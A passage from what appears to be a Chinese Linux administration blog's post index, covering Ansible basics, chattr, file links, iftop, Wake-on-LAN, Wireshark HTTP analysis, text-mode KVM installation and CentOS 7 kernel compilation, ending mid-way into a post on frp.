ansible 版本 root@ubuntu:/home/fwj# ansible --version ansible 2.0.0.2 config file = /etc/ansible/ansible.cfg configured module search path = Default w/o overridesansible 运行环境ansible 配置文件是以 ini 格式存储配置数据的，在 ansible 中，几乎所有的配置项都可以通过 ansible 的 playbook 或环境变量来重新赋值。在执行 ansible 命令时，命令将会安装预设的顺序查找配置文件。 1.ansible_config：首先ansible 命令会检查环境变量，及这个环境变量将指向的配置文件2.ansible.cfg 再次，将会检查当前用户 home 目录下的.ansible.cfg配置文件3./etc/ansible/ansbile.cfg最后，会检查在软件包安装管理工具安装 ansbile 时自动产生的配置文件 ansible.cfg 配置参数 inventory—– 这个参数表示资源清单 inventory 文件的位置，资源清单其实就是一些 ansible 需要连接管理主机的列表，默认是在/etc/ansible/hosts root@ubuntu:/home/fwj# cat /etc/ansible/ansible.cfg | grep inventory #inventory = /etc/ansible/hosts # if inventory variables overlap, does the higher precedence one win libary — ansible 的操作动作，无论是本地还是远程，都会使用一小段代码来执行，这小段代码称为模块。这个 libary 参数就是指向存放 ansible 模块的目录，配置如下 root@ubuntu:/home/fwj# cat /etc/ansible/ansible.cfg | grep library #library = /usr/share/my_modules/ forks，ansible 最多能有多少个进程同时工作，默认设置最多5个进程并行处理。设置多个，可以根据主机的性能和被管理阶段的数量来决定 root@ubuntu:/home/fwj# cat /etc/ansible/ansible.cfg | grep forks #forks = 5 sudo_user 默认是 root，默认执行命令的用户 remote——port 默认端口，是22 host_key_checking 是否检查 ssh 主机密钥 timeout ssh 超时时间，默认60s log——path ansible 默认不记录日志，如需要可以在该处定义，另外需要注意执行 ansible 的用户需要对日志有写权限 配置 hosts ansible的配置文件在/etc/ansible/hosts中，我们可以编辑配置文件，比如说，我希望管理2台虚拟主机用来构建一个lvs的环境，他们的ip分别是10.2.100.129和10.2.100.130. 我们可以在配置文件中增加如下内容[node-nginx] 表示我把这2个服务器分在了node-nginx 这个组里 [node-nginx] 10.2.100.129 10.2.100.130配置免密码登陆 那么，编辑完后，我们可以测试下了,在测试之前，最好创建一个本地的ssh密钥，然后通过ssh-copy 复制到远程的主机，这样避免使用过程中出现频繁的输入密码的问题。 [root@localhost ~]# ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Created directory &apos;/root/.ssh&apos;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is: d6:59:b5:ad:b7:e7:2e:5a:bb:87:e6:6c:ab:d1:31:c4 root@localhost.localdomain The key&apos;s randomart image is: +--[ RSA 2048]----+ | . | | o o | | . E .| | . o . . | | S o + .| | . . +.| | . oo.| | +=oo| | o***o| +-----------------+然后 [root@localhost ~]# ssh-copy-id root@10.2.100.129 The authenticity of host &apos;10.2.100.129 (10.2.100.129)&apos; can&apos;t be established. RSA key fingerprint is f3:57:c2:9c:1a:b0:7a:2a:7d:cc:d1:7e:d5:eb:13:0a. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;10.2.100.129&apos; (RSA) to the list of known hosts. root@10.2.100.129&apos;s password: Now try logging into the machine, with &quot;ssh &apos;root@10.2.100.129&apos;&quot;, and check in: .ssh/authorized_keys to make sure we haven&apos;t added extra keys that you weren&apos;t expecting. [root@localhost ~]# ssh-copy-id root@10.2.100.130 root@10.2.100.130&apos;s password: Now try logging into the machine, with &quot;ssh &apos;root@10.2.100.130&apos;&quot;, and check in: .ssh/authorized_keys to make sure we haven&apos;t added extra keys that you weren&apos;t expecting.使用 ping嗯，准备工作完毕，我们可以开始最基础的ansbile操作了，使用ansible all -m ping 他会连接你ansible配置文件里所有的服务器发送ping的命令，执行成功显示如下： [root@localhost ~]# ansible all -m ping 10.2.100.129 | SUCCESS =&gt; { &quot;changed&quot;: false, &quot;ping&quot;: &quot;pong&quot; } 10.2.100.130 | SUCCESS =&gt; { &quot;changed&quot;: false, &quot;ping&quot;: &quot;pong&quot; }那么，如果你只希望对某个组内的服务器进行远程管理，只需要把all 替换成对应的组就可以了 [root@localhost ~]# ansible node-nginx -m ping 10.2.100.129 | SUCCESS =&gt; { &quot;changed&quot;: false, &quot;ping&quot;: &quot;pong&quot; } 10.2.100.130 | SUCCESS =&gt; { &quot;changed&quot;: false, &quot;ping&quot;: &quot;pong&quot; }批量执行命令1.比如我希望查看当前登录用户都有谁，可以使用-m command -a &quot;who&quot; 去看这两台机器都连接了那些用户 [root@localhost ~]# ansible node-nginx -m command -a &quot;who&quot; 10.2.100.129 | SUCCESS | rc=0 &gt;&gt; root pts/0 2017-01-06 14:07 (10.2.100.1) root pts/1 2017-01-06 14:38 (10.2.100.128) 10.2.100.130 | SUCCESS | rc=0 &gt;&gt; root pts/0 2017-01-06 14:07 (10.2.100.1) root pts/1 2017-01-06 14:38 (10.2.100.128)2.安装软件包，比如我们希望在远程服务器执行yum -y install gcc，可以执行如下命令 [root@localhost ~]# ansible node-nginx -m command -a &quot;yum -y install gcc&quot; 10.2.100.129 | SUCCESS | rc=0 &gt;&gt; Loaded plugins: fastestmirror Setting up Install Process Loading mirror speeds from cached hostfile * base: mirrors.cn99.com * extras: mirrors.zju.edu.cn * updates: mirrors.cn99.com Resolving Dependencies --&gt; Running transaction check ---&gt; Package gcc.x86_64 0:4.4.7-17.el6 will be installed --&gt; Processing Dependency: libgomp = 4.4.7-17.el6 for package: gcc-4.4.7-17.el6.x86_64 --&gt; Processing Dependency: cpp = 4.4.7-17.el6 for package: gcc-4.4.7-17.el6.x86_64 --&gt; Processing Dependency: glibc-devel &gt;= 2.2.90-12 for package: gcc-4.4.7-17.el6.x86_64 --&gt; Processing Dependency: cloog-ppl &gt;= 0.15 for package: gcc-4.4.7-17.el6.x86_64 --&gt; Processing Dependency: libgomp.so.1()(64bit) for package: ……略3.执行脚本 [root@localhost ~]# ansible node-nginx -m command -a &quot;/etc/init.d/iptables stop&quot; 10.2.100.129 | SUCCESS | rc=0 &gt;&gt; iptables: Setting chains to policy ACCEPT: filter [ OK ] iptables: Flushing firewall rules: [ OK ] iptables: Unloading modules: [ OK ] 10.2.100.130 | SUCCESS | rc=0 &gt;&gt; iptables: Setting chains to policy ACCEPT: filter [ OK ] iptables: Flushing firewall rules: [ OK ] iptables: Unloading modules: [ OK ]帮助信息1.help root@ubuntu:/home/fwj# ansible –help 2.ansible-doc 可以列出 ansible 支持的模块 root@ubuntu:/home/fwj# ansible-doc -l3.查看 yum 模块 root@ubuntu:/home/fwj# ansible-doc -s yum less 481 (GNU regular expressions) Copyright (C) 1984-2015 Mark Nudelman less comes with NO WARRANTY, to the extent permitted by law. For information about the terms of redistribution, see the file named README in the less distribution. Homepage: http://www.greenwoodsoftware.com/less - name: Manages packages with the `yum&apos; package manager action: yum conf_file # The remote yum configuration file to use for the transaction. disable_gpg_check # Whether to disable the GPG checking of signatures of packages being installed. Has an effect only if state is `present&apos; or `latest&apos;. disablerepo # `Repoid&apos; of repositories to disable for the install/update operation. These repos will not persist beyond the transaction. When specifying multiple repos, separate them with a &quot;,&quot;. enablerepo # `Repoid&apos; of repositories to enable for the install/update operation. These repos will not persist beyond the transaction. When specifying multiple repos, separate them with a &quot;,&quot;. exclude # Package name(s) to exclude when state=present, or latest list # Various (non-idempotent) commands for usage with `/usr/bin/ansible&apos; and `not&apos; playbooks. See examples. name= # Package name, or package specifier with version, like `name-1.0&apos;. When using state=latest, this can be &apos;*&apos; which means run: yum -y update. You can also pass a url or a local path to a rpm file. To operate on several packages this can accept a comma separated list of packages or (as of 2.0) a list of packages. state # Whether to install (`present&apos; or `installed&apos;, `latest&apos;), or remove (`absent&apos; or `removed&apos;) a package. update_cache # Force updating the cache. Has an effect only if state is `present&apos; or `latest&apos;.ansible 组件介绍ansible Inventory1.支持多个 inventory，可以通过修改 ansible.cfg中的 hosts 文件的定义，或使用 ANSIBLE-HOSTS 环境 变量定义。不同的文件存放不同的主机。 root@ubuntu:/opt/ansible# pwd /opt/ansible root@ubuntu:/opt/ansible# cat /etc/ansible/ansible.cfg # config file for ansible -- http://ansible.com/ # ============================================== # nearly all parameters can be overridden in ansible-playbook # or with command line flags. ansible will read ANSIBLE_CONFIG, # ansible.cfg in the current working directory, .ansible.cfg in # the home directory or /etc/ansible/ansible.cfg, whichever it # finds first [defaults] # some basic default values... inventory = /opt/ansible/2.动态 inventory 在实际应用部署中可能会有大量的主机列表。如果需要手动维护是一个非常繁琐的事情。因此，我们可以使用 ansible 的动态 inventory 来实现。不过这里就不写了 有需要在看吧。 内置参数 参数 解释 列子 ansible_ssh_host 定义 host ssh 地址 ansible_ssh_host=192.168.1.117 ansible_ssh_port 定义 ssh 端口 ansible_ssh_port=500 ansible_ssh_user 定义 ssh 认证用户 ansbile_ssh_user=root ansibe_ssh_pass 定义 ssh 认证密码 ansible_ssh_pass=’123’ ansible_sudo 定义 hosts sudo 用户 ansible_sudo=pi ansible_sudo_pass 定义 hosts sudo 密码 ansible_sudo_pass=’123’ ansible_sudo _exe 定义 hosts sudo 路径 ansible_sudo _exe=/usr/bin/sudo ansible_connection 定义 hosts 连接方式 ansible_connection=local anasible_ssh_private_ket_file 定义 host 私钥 ansible_ssh_private_key_file=/root/key ansible_shell_type 定义 shell类型 ansible_shel_type=zsh ansible_python_interpreter 定义 hosts 任务执行 python 的路径 Ansible Ad-Hoc 命令执行 shellansible 的命令都是并发执行的 root@ubuntu:/opt/ansible# ansible rhce -m shell -a &quot;hostname&quot; -o 192.168.1.111 | SUCCESS | rc=0 | (stdout) elk 192.168.1.117 | SUCCESS | rc=0 | (stdout) server 192.168.1.100 | SUCCESS | rc=0 | (stdout) client 我们除了默认定义的并发参数 forks 来控制，还可以通过-f 参数指定 root@ubuntu:/opt/ansible# ansible rhce -m shell -a &quot;uname -ar&quot; -f 3 -o 192.168.1.100 | SUCCESS | rc=0 | (stdout) Linux client 3.10.0-514.21.2.el7.x86_64 #1 SMP Tue Jun 20 12:24:47 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 192.168.1.111 | SUCCESS | rc=0 | (stdout) Linux elk 3.10.0-514.el7.x86_64 #1 SMP Tue Nov 22 16:42:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux 192.168.1.117 | SUCCESS | rc=0 | (stdout) Linux server 3.10.0-514.26.1.el7.x86_64 #1 SMP Thu Jun 29 16:05:25 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 复制文件复制文件，我们还可以使用 copy 模块来批量下发文件，文件变化通过 md5值来判断 root@ubuntu:/opt/ansible# ansible rhce -m copy -a &apos;src=/opt/ansible/lvs dest=/root/&apos; 192.168.1.100 | SUCCESS =&gt; { &quot;changed&quot;: true, &quot;checksum&quot;: &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;, &quot;dest&quot;: &quot;/root/lvs&quot;, &quot;gid&quot;: 0, &quot;group&quot;: &quot;root&quot;, &quot;md5sum&quot;: &quot;d41d8cd98f00b204e9800998ecf8427e&quot;, &quot;mode&quot;: &quot;0644&quot;, &quot;owner&quot;: &quot;root&quot;, &quot;size&quot;: 0, &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1499222285.22-249531326889064/source&quot;, &quot;state&quot;: &quot;file&quot;, &quot;uid&quot;: 0 } 192.168.1.111 | SUCCESS =&gt; { &quot;changed&quot;: true, &quot;checksum&quot;: &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;, &quot;dest&quot;: &quot;/root/lvs&quot;, &quot;gid&quot;: 0, &quot;group&quot;: &quot;root&quot;, &quot;md5sum&quot;: &quot;d41d8cd98f00b204e9800998ecf8427e&quot;, &quot;mode&quot;: &quot;0644&quot;, &quot;owner&quot;: &quot;root&quot;, &quot;size&quot;: 0, &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1499222285.24-61671295731904/source&quot;, &quot;state&quot;: &quot;file&quot;, &quot;uid&quot;: 0 } 192.168.1.117 | SUCCESS =&gt; { &quot;changed&quot;: true, &quot;checksum&quot;: &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;, &quot;dest&quot;: &quot;/root/lvs&quot;, &quot;gid&quot;: 0, &quot;group&quot;: &quot;root&quot;, &quot;md5sum&quot;: &quot;d41d8cd98f00b204e9800998ecf8427e&quot;, &quot;mode&quot;: &quot;0644&quot;, &quot;owner&quot;: &quot;root&quot;, &quot;size&quot;: 0, &quot;src&quot;: &quot;/root/.ansible/tmp/ansible-tmp-1499222285.28-75392449086873/source&quot;, &quot;state&quot;: &quot;file&quot;, &quot;uid&quot;: 0 }当然这中间你还可以自定义 owner mode 等设置 包管理服务root@ubuntu:/opt/ansible# ansible rhce -m yum -a &apos;name=httpd state=latest&apos;","categories":[],"tags":[{"name":"ansible","slug":"ansible","permalink":"https://awen.me/tags/ansible/"},{"name":"自动化运维","slug":"自动化运维","permalink":"https://awen.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4/"}]},{"title":"Linux 的chattr和lsattr命令","slug":"Linux-的chattr和lsattr命令","date":"2017-06-14T11:49:47.000Z","updated":"2021-02-26T06:05:29.256Z","comments":true,"path":"posts/3642374434.html","link":"","permalink":"https://awen.me/posts/3642374434.html","excerpt":"##chattr命令 Linux chattr命令用于改变文件属性。 这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式： a：让文件或目录仅供附加用途。 b：不更新文件或目录的最后存取时间。 c：将文件或目录压缩后存放。 d：将文件或目录排除在倾倒操作之外。 i：不得任意更动文件或目录。 s：保密性删除文件或目录。 S：即时更新文件或目录。 u：预防以外删除。","text":"##chattr命令 Linux chattr命令用于改变文件属性。 这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式： a：让文件或目录仅供附加用途。 b：不更新文件或目录的最后存取时间。 c：将文件或目录压缩后存放。 d：将文件或目录排除在倾倒操作之外。 i：不得任意更动文件或目录。 s：保密性删除文件或目录。 S：即时更新文件或目录。 u：预防以外删除。 语法chattr[-RV][-v&lt;版本编号&gt;][+/-/=&lt;属性&gt;][文件或目录…]参数 -R 递归处理，将指定目录下的所有文件及子目录一并处理。 -v&lt;版本编号&gt; 设置文件或目录版本。 -V 显示指令执行过程。 +&lt;属性&gt; 开启文件或目录的该项属性。 -&lt;属性&gt; 关闭文件或目录的该项属性。 =&lt;属性&gt; 指定文件或目录的该项属性。 实例 用chattr命令防止系统中某个关键文件被修改： # chattr +i /opt/back.sh 会显示如下属性 —-i——–/etc/resolv.conf 让某个文件只能往里面追加数据，但不能删除，适用于各种日志文件： # chattr +a /opt/back.sh lsattr命令功能:查看文件扩展属性 # lsattr back.sh ----ia-------e- back.sh","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux链接概念","slug":"Linux链接概念","date":"2017-06-14T11:49:09.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/3562069462.html","link":"","permalink":"https://awen.me/posts/3562069462.html","excerpt":"Linux链接分两种，一种被称为硬链接（Hard Link），另一种被称为符号链接（Symbolic Link）。默认情况下，ln命令产生硬链接。 硬连接硬连接指通过索引节点来进行连接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在Linux中，多个文件名指向同一索引节点是存在的。一般这种连接就是硬连接。硬连接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的连接。只删除一个连接并不影响索引节点本身和其它的连接，只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。","text":"Linux链接分两种，一种被称为硬链接（Hard Link），另一种被称为符号链接（Symbolic Link）。默认情况下，ln命令产生硬链接。 硬连接硬连接指通过索引节点来进行连接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在Linux中，多个文件名指向同一索引节点是存在的。一般这种连接就是硬连接。硬连接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的连接。只删除一个连接并不影响索引节点本身和其它的连接，只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。 软连接另外一种连接称之为符号连接（Symbolic Link），也叫软连接。软链接文件有类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 中监控网络连接和实时流量---iftop","slug":"Linux-中监控网络连接和实时流量-iftop","date":"2017-06-14T11:48:03.000Z","updated":"2021-02-26T06:05:29.254Z","comments":true,"path":"posts/2350605529.html","link":"","permalink":"https://awen.me/posts/2350605529.html","excerpt":"##iftop iftop 是 uninx 或 linux 操作系统中用来查看实时的网络流量、监控 TCP/IP 连接等。 1.界面介绍","text":"##iftop iftop 是 uninx 或 linux 操作系统中用来查看实时的网络流量、监控 TCP/IP 连接等。 1.界面介绍 界面上面显示的是类似刻度尺的刻度范围，为显示流量图形的长条作标尺用的。 中间的&lt;= =&gt;这两个左右箭头，表示的是流量的方向。 TX：发送流量RX：接收流量TOTAL：总流量Cumm：运行iftop到目前时间的总流量peak：流量峰值rates：分别表示过去 2s 10s 40s 的平均流量 2、iftop相关参数 常用的参数 -i设定监测的网卡，如：# iftop -i eth1 -B 以bytes为单位显示流量(默认是bits)，如：# iftop -B -n使host信息默认直接都显示IP，如：# iftop -n -N使端口信息默认直接都显示端口号，如: # iftop -N -F显示特定网段的进出流量，如# iftop -F iftop -F 10.0.4.0/24 -h（display this message），帮助，显示参数信息 -p使用这个参数后，中间的列表显示的本地主机信息，出现了本机以外的IP信息; -b使流量图形条默认就显示; -f这个暂时还不太会用，过滤计算包用的; -P使host信息及端口信息默认就都显示; -m设置界面最上边的刻度的最大值，刻度分五个大段显示，例：# iftop -m 100M 进入iftop画面后的一些操作命令(注意大小写) 按h切换是否显示帮助; 按n切换显示本机的IP或主机名; 按s切换是否显示本机的host信息; 按d切换是否显示远端目标主机的host信息; 按t切换显示格式为2行/1行/只显示发送流量/只显示接收流量; 按N切换显示端口号或端口服务名称; 按S切换是否显示本机的端口信息; 按D切换是否显示远端目标主机的端口信息; 按p切换是否显示端口信息; 按P切换暂停/继续显示; 按b切换是否显示平均流量图形条; 按B切换计算2秒或10秒或40秒内的平均流量; 按T切换是否显示每个连接的总流量; 按l打开屏幕过滤功能，输入要过滤的字符，比如ip,按回车后，屏幕就只显示这个IP相关的流量信息; 按L切换显示画面上边的刻度;刻度不同，流量图形条会有变化; 按j或按k可以向上或向下滚动屏幕显示的连接记录; 按1或2或3可以根据右侧显示的三列流量数据进行排序; 按&lt;根据左边的本机名或IP排序; 按&gt;根据远端目标主机的主机名或IP排序; 按o切换是否固定只显示当前的连接; 按q退出监控。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"centos 查看是否支持网络唤醒","slug":"centos-查看是否支持网络唤醒","date":"2017-06-14T11:46:26.000Z","updated":"2021-02-26T06:05:29.270Z","comments":true,"path":"posts/2800907332.html","link":"","permalink":"https://awen.me/posts/2800907332.html","excerpt":"使用 ethtool 查看网卡","text":"使用 ethtool 查看网卡 [root@kvm-vritual-host images]# ethtool eth0 Settings for eth0: Supported ports: [ TP MII ] Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Half 1000baseT/Full Supported pause frame use: No Supports auto-negotiation: Yes Advertised link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Advertised pause frame use: Symmetric Receive-only Advertised auto-negotiation: Yes Link partner advertised link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Half 1000baseT/Full Link partner advertised pause frame use: Symmetric Receive-only Link partner advertised auto-negotiation: Yes Speed: 1000Mb/s Duplex: Full Port: MII PHYAD: 0 Transceiver: internal Auto-negotiation: on Supports Wake-on: pumbg Wake-on: g Current message level: 0x00000033 (51) drv probe ifdown ifup Link detected: yes重点看，如果 Wake-on 为 g 则表示开启，如果未 d 则未开启需要使用 ethtool -s eth0 wol g 开启它 Supports Wake-on: pumbg Wake-on: g","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"wireshark 网络数据包分析","slug":"wireshark-网络数据包分析","date":"2017-06-14T11:45:41.000Z","updated":"2021-02-26T06:05:29.294Z","comments":true,"path":"posts/3085110836.html","link":"","permalink":"https://awen.me/posts/3085110836.html","excerpt":"什么是 wiresharkwireshark 是一款开源的 跨平台的数据包分析软件，你可以在https://www.wireshark.org/download.html获取安装程序安装","text":"什么是 wiresharkwireshark 是一款开源的 跨平台的数据包分析软件，你可以在https://www.wireshark.org/download.html获取安装程序安装 如何抓包wireshark 抓包需要指定网卡接口，比如我在 mac 下使用 WiFi 那么就选择Wi-Fi:en0 如果报错，说明没有运行程序的权限，打开终端，输入 sudo wiereshark 然后输入密码 运行程序，Windows 没有这个问题 运行后选择接口，就可以抓包了 接口权限sudo chgrp admin /dev/bpf* sudo chmod g+rw /dev/bpf*分析 http 流比如我喜欢用得到 app 听音频，突然发现特别卡，我需要使用 wireshark 抓手机的包分析下卡的原因。 1.过滤 http 2.追踪 HTTP 流 3.可以看三次握手 4.查看流内容 内容如下 GET /aac/201706/27/64000_201706271514566583857366.m4a HTTP/1.1 Host: igetoss.cdn.igetget.com Range: bytes=1262466- Accept: */* Ice-MetaData: 0 Connection: close User-Agent: %E5%BE%97%E5%88%B0/2.9.90 CFNetwork/811.5.4 Darwin/16.6.05.查看节点信息 ➜ ~ dig igetoss.cdn.igetget.com ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; igetoss.cdn.igetget.com ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9910 ;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;igetoss.cdn.igetget.com. IN A ;; ANSWER SECTION: igetoss.cdn.igetget.com. 15 IN CNAME igetoss.cdn.igetget.com.cdn20.com. igetoss.cdn.igetget.com.cdn20.com. 15 IN CNAME netcenter.dlmix.ourdvs.com. netcenter.dlmix.ourdvs.com. 15 IN A 150.138.167.141 netcenter.dlmix.ourdvs.com. 15 IN A 117.21.168.75 netcenter.dlmix.ourdvs.com. 15 IN A 58.222.18.117 ;; Query time: 31 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Sun Jul 2 12:42:22 2017 ;; MSG SIZE rcvd: 170 ➜ ~ ba cdn20.com {&quot;nature&quot;:&quot;企业&quot;,&quot;icp&quot;:&quot;京ICP备09037435号&quot;,&quot;indexUrl&quot;:&quot;www.cdn20.com&quot;,&quot;sitename&quot;:&quot;厦门龙讯网站&quot;,&quot;domain&quot;:&quot; cdn20.com &quot;,&quot;nowIcp&quot;:&quot;京ICP备09037435号-2&quot;,&quot;type&quot;:200,&quot;search&quot;:&quot;cdn20.com&quot;,&quot;checkDate&quot;:&quot;&quot;,&quot;name&quot;:&quot;网宿科技股份有限公司北京分公司&quot;}% ➜ ~ ip 183.134.14.67 HTTP/1.1 200 OK Connection: keep-alive Content-Length: 40 Content-Type: text/plain; charset=utf-8 Date: Sun, 02 Jul 2017 04:42:40 GMT Proxy-Connection: keep-alive Server: NewDefend X-Cache: BYPASS from cmb-js-223-112-227-069 [ &quot;中国&quot;, &quot;浙江&quot;, &quot;嘉兴&quot;, &quot;&quot;, &quot;电信&quot; ]音频播放地址:http://igetoss.cdn.igetget.com/aac/201706/27/64000_201706271514566583857366.m4a 哈哈，发现得到用的是网宿的 cdn。恩我们是要分析为啥卡的，不过我再次尝试好像没有出现卡的问题了。","categories":[],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://awen.me/tags/wireshark/"}]},{"title":"KVM 虚拟化之 使用文本模式安装系统","slug":"KVM-虚拟化之-使用文本模式安装系统","date":"2017-06-14T11:44:40.000Z","updated":"2021-02-26T06:05:29.251Z","comments":true,"path":"posts/1528656599.html","link":"","permalink":"https://awen.me/posts/1528656599.html","excerpt":"此前我们介绍过如何通过 vnc 的方式连接虚拟机进行操作系统的安装https://awen.me/archives/376.html 这篇文章，我们讨论下如何通过控制台纯文本模式去安装一个 centos7操作系统 使用平台操作系统:centos7.3","text":"此前我们介绍过如何通过 vnc 的方式连接虚拟机进行操作系统的安装https://awen.me/archives/376.html 这篇文章，我们讨论下如何通过控制台纯文本模式去安装一个 centos7操作系统 使用平台操作系统:centos7.3 参考命令virt-install \\ --name centos7 \\ --ram 4096 \\ --disk path=/vm-images/vm1.img,size=30 \\ --vcpus 2 \\ --os-type linux \\ --os-variant rhel7 \\ --network bridge=br0 \\ --network bridge=br0 \\ --graphics none \\ --console pty,target_type=serial \\ --location &apos;http://mirrors.aliyun.com/centos/7/os/x86_64/&apos; \\ --extra-args &apos;console=ttyS0,115200n8 serial&apos;配置说明 –name 指定虚拟机的名称–ram 指定Virtual Machine–disk的内存量path = xxx，size = xxx‘path =’⇒指定虚拟机size =’⇒指定虚拟机的磁盘数量–vcpus 指定虚拟CPU–os-type 指定GuestOS 的类型–os-variant 指定GuestOS的类型 - 可能确认列表中使用以下命令osinfo-query os–network 指定虚拟机的网络类型–graphics 指定图形的类型。如果设置为“无”，则意味着非图形。–console 指定控制台类型–location 指定安装的位置，其中from–extra-args 指定在内核中设置的参数 得到的结果 [root@localhost ~]# virt-install \\ &gt; --name centos7 \\ &gt; --ram 4096 \\ &gt; --disk path=/vm-images/vm1.img,size=30 \\ &gt; --vcpus 2 \\ &gt; --os-type linux \\ &gt; --os-variant rhel7 \\ &gt; --network bridge=br0 \\ &gt; --network bridge=br0 \\ &gt; --graphics none \\ &gt; --console pty,target_type=serial \\ &gt; --location &apos;http://mirrors.aliyun.com/centos/7/os/x86_64/&apos; \\ &gt; --extra-args &apos;console=ttyS0,115200n8 serial&apos; Starting install... Retrieving file vmlinuz... | 5.1 MB 00:00:04 Retrieving file initrd.img... | 41 MB 00:00:41 Creating domain... | 0 B 00:00:00 Connected to domain centos7 Escape character is ^] ……然后这样会去互联网下载你也可以这样 virt-install \\ --name node-server-4 \\ --ram 1024 \\ --disk path=/vm-images/node-server-4.img,size=30 \\ --vcpus 2 \\ --os-type linux \\ --os-variant rhel7 \\ --network bridge=br0 \\ --network bridge=br0 \\ --graphics none \\ --console pty,target_type=serial \\ --location /vm-iso/CentOS-7-x86_64-DVD-1611.iso \\ #替换成本地的镜像文件 --extra-args &apos;console=ttyS0,115200n8 serial&apos;加载完之后会出现如下界面，选择2，从文本模式安装 然后根据提示选择，标识！号的是需要设置的都有对应的数字编号，按 q 退出，按 c 继续，按 b 进行下一步，设备的内容和图形化安装是一样的，配置磁盘、选择安装的系统类型，设置 root 密码，配置网络等等，下图是选择完后进行安装的界面 全部安装完后启动也是在文本模式启动 进入 login 界面","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"Centos 7 编译内核","slug":"Centos-7-编译内核","date":"2017-06-14T11:43:50.000Z","updated":"2021-02-26T06:05:29.242Z","comments":true,"path":"posts/994241225.html","link":"","permalink":"https://awen.me/posts/994241225.html","excerpt":"安装包yum -y install ncurses-devel openssl-devel elfutils-libelf-devel","text":"安装包yum -y install ncurses-devel openssl-devel elfutils-libelf-devel 下载内核 解压cd /usr/src/ wget -c https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.10.13.tar.xz tar xf linux-4.10.13.tar.xz编译cp /boot/config-3.10.0-514.16.1.el7.x86_64 .config make menuconfig 弹出如下对话框，选择 Load（可以按 TAB 键选择），然后加载本地的.config文件 其中：[]或&lt;&gt;表示未选择[M]或 &lt;M&gt;表示编译成模块[*]或&lt;*&gt; 表示编译进内核 比如说我们要将 BBR 这个模块进行编译，我们需要找到 Networking Support —&gt; Network options—&gt; TCP: Advanced congestion algorithm 选择 BBR，在其前面的选择 M 后保存 然后保存后退出，执行 make prepare #清理之前编译留下的垃圾，如果第一次编译，可以忽略 make -j 4 # 开启4线程进行编译，速度更快，需要 CPU 支持 make modules_install #编译模块 make install #安装执行如下命令 awk -F\\&apos; &apos;$1==&quot;menuentry &quot; {print i++ &quot; : &quot; $2}&apos; /etc/grub2.cfg会出现如下内容 0 : CentOS Linux (4.10.13) 7 (Core) 1 : CentOS Linux (3.10.0-514.16.1.el7.x86_64) 7 (Core) 2 : CentOS Linux (3.10.0-514.el7.x86_64) 7 (Core) 3 : CentOS Linux (0-rescue-ea321ca5d6ef4103bbcfb9e680e0759e) 7 (Core)设置第0项为开机默认启动项 grub2-set-default 0重启查看 [root@localhost ~]# uname -r 4.10.13","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"kernel","slug":"kernel","permalink":"https://awen.me/tags/kernel/"}]},{"title":"使用 frp 访问内网的 http 服务","slug":"使用-frp-访问内网的-http-服务","date":"2017-06-14T11:42:39.000Z","updated":"2021-02-26T06:05:29.305Z","comments":true,"path":"posts/517373777.html","link":"","permalink":"https://awen.me/posts/517373777.html","excerpt":"今天给大家分享下怎么把本机的 web 